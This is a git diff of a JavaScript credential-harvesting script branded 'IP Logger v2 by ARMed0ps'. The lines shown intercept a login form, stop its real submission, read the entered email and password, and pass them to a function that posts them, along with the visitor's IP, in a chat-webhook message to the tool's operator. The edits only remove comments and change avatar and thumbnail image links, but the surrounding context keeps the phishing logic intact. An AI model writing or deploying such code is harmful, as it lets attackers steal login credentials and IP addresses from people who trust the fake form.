@@ -1,10 +1,10 @@
 document.getElementById('loginForm').addEventListener('submit', function (e) {
-    e.preventDefault(); // stop actual form from submitting
+    e.preventDefault();
 
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
-    sendIPnlogin(email, password); // call the IP + login sending function
+    sendIPnlogin(email, password);
 });
 
 const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
@@ -23,8 +23,8 @@ const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "1pl0gg3r", // optionally changeable
-                            avatar_url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D", // optionally changeable
+                            username: "1pl0gg3r", // changeable
+                            avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/IP-Logger%20pfp.png", // changeable
                             content: `@everyone`,
                             embeds: [
                                 {
@@ -63,11 +63,11 @@ const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
                                         }
                                     ],
                                     thumbnail: {
-                                        url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+                                        url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/IP-Logger%20pfp.png" // changeable
                                     },
                                     footer: {
                                         text: "IP Logger v2 by ARMed0ps",
-                                        icon_url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+                                        icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/IP-Logger%20pfp.png" // changeable
                                     },
                                     timestamp: new Date().toISOString()
                                 }
